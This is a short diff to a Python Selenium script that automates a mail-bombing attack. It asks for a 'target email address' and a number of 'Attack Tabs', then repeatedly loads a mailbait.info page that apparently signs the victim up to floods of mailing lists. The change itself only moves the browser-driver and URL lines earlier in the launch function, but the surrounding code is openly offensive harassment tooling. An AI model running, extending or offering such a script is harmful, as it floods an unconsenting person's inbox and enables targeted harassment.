@@ -3,6 +3,8 @@ import time
 from random import randint
 
 def launch():
+	driver = webdriver.Chrome()
+	url = "https://mailbait.info/run.html"
 	email = input('Please enter target email address: ')
 	windows = int(input('How many Windows of 10 Attack Tabs would you like to open? '))
 	
@@ -11,8 +13,6 @@ def launch():
 	print('Starting attack in 5 seconds')
 	time.sleep(5)
 	
-	url = "https://mailbait.info/run.html"
-	driver = webdriver.Chrome()
 	for i in range(windows):
 	    driver.switch_to.window(driver.window_handles[-1])
 	    driver.get(url)
